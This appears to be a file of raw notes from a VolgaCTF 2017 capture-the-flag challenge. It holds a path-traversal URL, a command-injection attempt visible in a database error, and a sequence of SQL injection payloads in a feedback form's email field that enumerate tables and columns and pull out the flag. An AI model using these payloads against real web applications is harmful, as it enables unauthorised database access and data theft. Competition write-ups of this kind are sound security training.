@@ -1,0 +1,53 @@
+http://share-point.quals.2017.volgactf.ru/files/marcin/image3333
+
+http://share-point.quals.2017.volgactf.ru/index.php
+
+http://share-point.quals.2017.volgactf.ru/files/stack/../../login.php
+
+
+
+http://bloody-feedback.quals.2017.volgactf.ru/check/?code=
+
+NvOiHYkr8ZuAQ0y2FNCK7X60URdXSyrb
+uYDb0EfHGr1HFqcUDpmZMfgleERWYCMu
+vvBL7mGmLh3Ym6RCkZGvkw5P32ShHvSD
+
+
+pole email
+
+ERROR: DBD::Pg::db do failed: ERROR: syntax error at or near "echo" LINE 1: ... echo 'TEST'; ping -c 100 127.0.0.1;','' echo 'TEST... ^ at Worker.pm line 29.
+
+feedback_db
+
+
+
+name=t&email=', (SELECT table_name
+FROM information_schema.tables LIMIT 1))-- &message=t
+
+
+
+name=t&email=', (SELECT table_schema || '.' || table_name
+FROM information_schema.tables WHERE table_catalog LIKE 'feedback_db' LIMIT 1 OFFSET 1))-- &message=t
+
+
+Your message status is public.s3cret_tabl3
+
+
+name=t&email=', (SELECT table_name || '.' || column_name 
+FROM information_schema.columns WHERE table_catalog LIKE 'feedback_db' LIMIT 1 OFFSET 6))-- &message=t
+
+Your message status is s3cret_tabl3.s3cr3tc0lumn
+
+
+
+name=t&email=', (SELECT s3cr3tc0lumn 
+FROM s3cret_tabl3 LIMIT 1 OFFSET 1))-- &message=t
+
+VolgaCTF
+
+Volga
+
+1
+
+VolgaCTF{eiU7UJhyeu@ud3*}
+
